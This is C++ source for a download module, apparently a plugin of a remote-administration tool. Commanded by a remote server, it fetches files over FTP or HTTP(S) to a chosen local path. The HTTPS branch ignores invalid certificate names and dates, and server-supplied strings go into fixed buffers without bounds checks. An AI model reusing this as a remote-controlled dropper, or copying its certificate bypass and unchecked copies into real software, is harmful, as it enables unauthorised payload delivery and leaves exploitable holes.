#include "MiniDownload.h"
#include <stdio.h>
#include "IOCPClient.h"
#pragma comment(lib,"wininet.lib")

BOOL MakesureDirExist(const WCHAR* Path, BOOL bIncludeFileName = FALSE)
{
	WCHAR*pTempDir = (WCHAR*)malloc((wcslen(Path) + 1)*sizeof(WCHAR));
	wcscpy(pTempDir, Path);
	BOOL bResult = FALSE;
	WCHAR* pIt = NULL;
	//找到文件名.;
	if (bIncludeFileName)
	{
		pIt = pTempDir + wcslen(pTempDir) - 1;
		while (pIt[0] != '\\' && pIt[0] != '/' && pIt > pTempDir) pIt--;
		if (pIt[0] != '/' && pIt[0] != '\\')
			goto Return;
		//'/' ---> 0
		pIt[0] = 0;
	}
	//找到':';
	if ((pIt = wcsstr(pTempDir, L":")) == NULL || (pIt[1] != '\\' && pIt[1] != '/'))
		goto Return;
	pIt++;

	while (pIt[0])
	{
		WCHAR oldCh;
		//跳过'/'或'\\';
		while (pIt[0] && (pIt[0] == '\\' || pIt[0] == '/'))
			pIt++;
		//找到结尾.;
		while (pIt[0] && (pIt[0] != '\\' && pIt[0] != '/'))
			pIt++;
		//
		oldCh = pIt[0];
		pIt[0] = 0;

		if (!CreateDirectoryW(pTempDir, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
			goto Return;

		pIt[0] = oldCh;
	}
	bResult = TRUE;
Return:
	free(pTempDir);
	return bResult;
}

CMiniDownload::CMiniDownload(WCHAR* pInit,DWORD Identity):
CEventHandler(Identity)
{
	//save path + url.
	m_szSavePath = (WCHAR*)malloc(0x1000*sizeof(WCHAR));
	m_szUrlPath = (WCHAR*)malloc(0x1000*sizeof(WCHAR));
	m_szHost = (WCHAR*)malloc(0x1000*sizeof(WCHAR));
	m_szUser = (WCHAR*)malloc(0x1000*sizeof(WCHAR));
	m_szPassword = (WCHAR*)malloc(0x1000*sizeof(WCHAR));
	m_szExtraInfo = (WCHAR*)malloc(0x1000*sizeof(WCHAR));
	
	ZeroMemory(m_szSavePath,0x1000*sizeof(WCHAR));
	ZeroMemory(m_szUrlPath,0x1000*sizeof(WCHAR));
	ZeroMemory(m_szHost,0x1000*sizeof(WCHAR));
	ZeroMemory(m_szUser,0x1000*sizeof(WCHAR));
	ZeroMemory(m_szPassword,0x1000*sizeof(WCHAR));
	ZeroMemory(m_szExtraInfo,0x1000*sizeof(WCHAR));
	//
	m_pInit = pInit;

	m_Buffer = (char*)malloc(0x10000);

	m_ullTotalSize = 0;
	m_ullFinishedSize = 0;

	m_hConnect = NULL;
	m_hInternet = NULL;
	m_hRemoteFile = NULL;
	m_hLocalFile = INVALID_HANDLE_VALUE;
}


CMiniDownload::~CMiniDownload()
{
	free(m_szSavePath);
	free(m_szUrlPath);
	free(m_szHost);
	free(m_szUser);
	free(m_szPassword);
	free(m_szExtraInfo);
	free(m_Buffer);
}

void CMiniDownload::OnClose()
{
	if (m_hLocalFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hLocalFile);
		m_hLocalFile = INVALID_HANDLE_VALUE;
	}
	if (m_hRemoteFile != NULL)
	{
		InternetCloseHandle(m_hRemoteFile);
		m_hRemoteFile = NULL;
	}
	if (m_hConnect != NULL)
	{
		InternetCloseHandle(m_hConnect);
		m_hConnect = NULL;
	}
	if (m_hInternet != NULL)
	{
		InternetCloseHandle(m_hInternet);
		m_hInternet = NULL;
	}
}

void CMiniDownload::OnConnect()
{

}

void CMiniDownload::OnReadPartial(WORD Event, DWORD Total, DWORD Read, char*Buffer)
{

}
void CMiniDownload::OnReadComplete(WORD Event, DWORD Total, DWORD Read, char*Buffer)
{
	switch (Event)
	{
	case MNDD_GET_FILE_INFO:
		OnGetFileInfo();
		break;
	case MNDD_DOWNLOAD_CONTINUE:
		OnContinueDownload();
		break;
	case MNDD_DOWNLOAD_END:
		OnEndDownload();
		break;
	}
}

static long long atoll(const char *p)
{
	long long n;
	int c, neg = 0;
	unsigned char   *up = (unsigned char *)p;

	if (!isdigit(c = *up)) {
		while (isspace(c))
			c = *++up;
		switch (c) {
		case '-':
			neg++;
			/* FALLTHROUGH */
		case '+':
			c = *++up;
		}
		if (!isdigit(c))
			return (0);
	}

	for (n = '0' - c; isdigit(c = *++up); ) 
	{
		n *= 10; /* two steps to avoid unnecessary overflow */
		n += '0' - c; /* accum neg to avoid surprises at MAX */;
	}
	return (neg ? n : -n);
}

void CMiniDownload::OnEndDownload()
{
	Disconnect();
}
void CMiniDownload::OnContinueDownload()
{
	DownloadResult result = { 0 };
	//Continue Download.
	DWORD dwReadBytes = 0;
	memset(m_Buffer,0,0x10000);
	if (FALSE == InternetReadFile(m_hRemoteFile, m_Buffer, 0x10000, &dwReadBytes))
	{
		result.dwStatu = 1;
		goto Reply;
	}
	if (FALSE == WriteFile(m_hLocalFile, m_Buffer, dwReadBytes, &result.dwWriteSize, NULL) ||
		dwReadBytes != result.dwWriteSize)
	{
		result.dwStatu = 2;
		goto Reply;
	}
	m_ullFinishedSize += dwReadBytes;
	if (!dwReadBytes || m_ullFinishedSize == m_ullTotalSize)
	{
		result.dwStatu = 3;
		goto Reply;
	}
Reply:
	Send(MNDD_DOWNLOAD_RESULT, (char*)&result, sizeof(result));
	return;
}
void CMiniDownload::OnGetFileInfo()
{
	MnddFileInfo response = { 0 };
	//
	DWORD HttpFlag = NULL; 

	char buffer[128] = {0};			//http file size够了;
	DWORD dwBufferLength = 128;

	WCHAR*pUrl = wcsstr(m_pInit, L"\n");
	if (!pUrl)
	{
		//错误.;
		Disconnect();
		return;
	}
	*pUrl = 0;
	pUrl++;
	//Get Save Path And Url.;
	wcscpy(m_szSavePath, m_pInit);
	wcscat(m_szSavePath, L"\\");
	//
	memset(&url, 0, sizeof(url));
	url.dwStructSize = sizeof(url);
	url.lpszHostName = m_szHost;
	url.lpszPassword = m_szPassword;
	url.lpszUserName = m_szUser;
	url.lpszExtraInfo = m_szExtraInfo;
	url.lpszUrlPath = m_szUrlPath;

	url.dwHostNameLength = 0x1000 - 1;
	url.dwPasswordLength = 0x1000 - 1;
	url.dwUserNameLength = 0x1000 - 1;
	url.dwUrlPathLength = 0x1000 - 1;
	url.dwExtraInfoLength = 0x1000 - 1;

	//url解析失败;
	if (FALSE == InternetCrackUrl(pUrl, wcslen(pUrl), ICU_ESCAPE, &url))
	{
		response.dwStatu = MNDD_STATU_ANALYSE_URL_FAILED;
		goto ret;
	}
	//Get File Name
	WCHAR*p = m_szUrlPath + wcslen(m_szUrlPath) - 1;
	while (p > m_szUrlPath && p[0] != L'\\' && p[0] != L'/')
		p--;
	if ((p[0] == L'\\' || p[0] == L'/') && p[1])
		wcscat(m_szSavePath, p + 1);
	else
		wsprintf(m_szSavePath + wcslen(m_szSavePath), L"%u.dat", GetTickCount());
	//
	wcscat(m_szUrlPath, m_szExtraInfo);
	//
	m_hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
	if (!m_hInternet)
	{
		response.dwStatu = MNDD_STATU_INTERNETOPEN_FAILED;
		goto ret;
	}
	
	switch (url.nScheme)
	{
	case INTERNET_SCHEME_FTP:
		m_hConnect = InternetConnect(m_hInternet, m_szHost, url.nPort,
			m_szUser, m_szPassword, INTERNET_SERVICE_FTP, 0, 0);
		if (!m_hConnect)
		{
			response.dwStatu = MNDD_STATU_INTERNETCONNECT_FAILED;
			break;
		}
		m_hRemoteFile = FtpOpenFile(m_hConnect, m_szUrlPath, GENERIC_READ, 0, 0);
		if (!m_hRemoteFile)
		{
			response.dwStatu = MNDD_STATU_OPENREMOTEFILE_FILED;
			break;
		}
		response.dwFileSizeLo = FtpGetFileSize(m_hRemoteFile, &response.dwFileSizeHi);
		
		m_ullTotalSize = response.dwFileSizeHi;
		m_ullTotalSize <<= 32;
		m_ullTotalSize |= response.dwFileSizeLo;
		break;
	case INTERNET_SCHEME_HTTPS:
		HttpFlag |= (INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID
			| INTERNET_FLAG_IGNORE_CERT_DATE_INVALID);
	case INTERNET_SCHEME_HTTP:
		m_hConnect = InternetConnect(m_hInternet, m_szHost, url.nPort,
			m_szUser, m_szPassword, INTERNET_SERVICE_HTTP, 0, 0);
		if (!m_hConnect)
		{
			response.dwStatu = MNDD_STATU_INTERNETCONNECT_FAILED;
			break;
		}
		m_hRemoteFile = HttpOpenRequest(m_hConnect, L"GET", m_szUrlPath, L"1.1", NULL, NULL, HttpFlag, NULL);
		if (!m_hRemoteFile)
		{
			response.dwStatu = MNDD_STATU_OPENREMOTEFILE_FILED;
			break;
		}
		if(FALSE == HttpSendRequest(m_hRemoteFile, NULL, NULL, NULL, NULL))
		{
			response.dwStatu = MNDD_STATU_HTTPSENDREQ_FAILED;
			break;
		}
		if (!HttpQueryInfoA(m_hRemoteFile, HTTP_QUERY_CONTENT_LENGTH, buffer, &dwBufferLength, 0))
		{
			response.dwStatu = MNDD_STATU_UNKNOWN_FILE_SIZE; 
			m_ullTotalSize = -1;
			break;
		}
		m_ullTotalSize = atoll(buffer);
		response.dwFileSizeLo = m_ullTotalSize & 0xFFFFFFFF;
		response.dwFileSizeHi = (m_ullTotalSize >> 32) & 0xFFFFFFFF;
		break;
	default:
		response.dwStatu = MNDD_STATU_UNSUPPORTED_PROTOCOL;
		break;
	}
	MakesureDirExist(m_szSavePath,TRUE);
	m_hLocalFile = CreateFile(m_szSavePath, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (m_hLocalFile == INVALID_HANDLE_VALUE)
	{
		response.dwStatu = MNDD_STATU_OPENLOCALFILE_FAILED;
		goto ret;
	}
ret:
	Send(MNDD_FILE_SIZE, (char*)&response, sizeof(response));
	return;
}


/****************************Download Module Entry *********************************/

void BeginDownload(char* szServerAddr,unsigned short uPort,DWORD dwParam)
{
	CIOCPClient Client(szServerAddr,uPort);
	CMiniDownload Dwonload((WCHAR*)dwParam,MINIDOWNLOAD);

	Client.BindHandler(&Dwonload);
	Client.Run();
	Client.UnbindHandler();
}